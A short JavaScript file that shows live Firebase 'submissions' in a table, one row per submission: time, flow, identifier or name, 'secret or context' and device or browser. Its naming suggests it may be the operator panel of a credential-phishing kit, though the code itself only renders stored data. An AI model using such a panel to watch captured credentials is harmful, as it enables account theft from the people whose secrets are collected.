// live-panel.js
// Listens for new submissions and appends rows to the existing table in live.html.
// Include on live.html:
//   <script type="module" src="firebase-config.js"></script>
//   <script type="module" src="live-panel.js"></script>

import { ref, onChildAdded } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js";

const { db } = window.__FIREBASE__ || {};
if (!db) console.error("Firebase not initialized. Ensure firebase-config.js loads first.");

const params = new URLSearchParams(window.location.search);
const sessionId = params.get("session") || "default";

const table = document.querySelector("table");
let count = 0;

const addRow = (item) => {
  if (!table) return;
  const tr = document.createElement("tr");

  const tdWhen = document.createElement("td");
  const tdFlow = document.createElement("td");
  const tdIdentifier = document.createElement("td");
  const tdSecret = document.createElement("td");
  const tdDevice = document.createElement("td");

  tdWhen.textContent = item.when || "";
  tdFlow.textContent = item.flow || "";
  tdIdentifier.textContent = item.identifierOrName || "";
  tdSecret.textContent = item.secretOrContext || "";
  tdDevice.textContent = item.deviceBrowser || "";

  tr.appendChild(tdWhen);
  tr.appendChild(tdFlow);
  tr.appendChild(tdIdentifier);
  tr.appendChild(tdSecret);
  tr.appendChild(tdDevice);
  table.appendChild(tr);

  count++;
  console.debug(`Live Panel: ${count} submissions rendered.`);
};

const submissionsRef = ref(db, `sessions/${sessionId}/submissions`);
onChildAdded(submissionsRef, snapshot => {
  const item = snapshot.val();
  if (item) addRow(item);
});
